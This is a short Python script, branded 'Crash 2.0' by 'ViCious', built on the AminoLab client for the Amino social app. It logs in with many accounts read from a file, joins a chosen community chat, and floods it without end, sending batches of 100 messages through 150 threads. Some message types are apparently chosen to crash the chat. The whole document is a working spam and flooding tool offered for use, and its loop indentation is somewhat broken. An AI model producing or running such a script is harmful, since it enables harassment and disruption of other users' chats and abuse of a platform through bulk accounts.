import AminoLab
import concurrent.futures
import pyfiglet
from colored import fore, back, style, attr
attr(0)
print(fore.THISTLE_1 + style.BOLD)
print("""   Crash 2.0  Scrpit by """)
print(pyfiglet.figlet_format("ViCious", font="slant"))
c=AminoLab.Client()
pwd=input("password :")
linko=input('chat link: ')
ndc_Id=c.get_from_link(linko).ndc_Id
chato=c.get_from_link(linko).object_Id
for email in open("email.txt").read().split():
	c.auth(email,password=pwd)
	c.join_community(ndc_Id)
	print(f'join community ')
	c.join_thread(ndc_Id,chato)
	print(f'join chat ')
	msg = input("Message >> ")
	print("msg type :- 0,108,109,110,56")
	msgtype = input("Message Type >> ")
while True:
		print("Spamming...")
		with concurrent.futures.ThreadPoolExecutor(max_workers=150) as executor:
			_ = [executor.submit(c.send_message, ndc_Id,chato, msg, msgtype) for _ in range(100)]
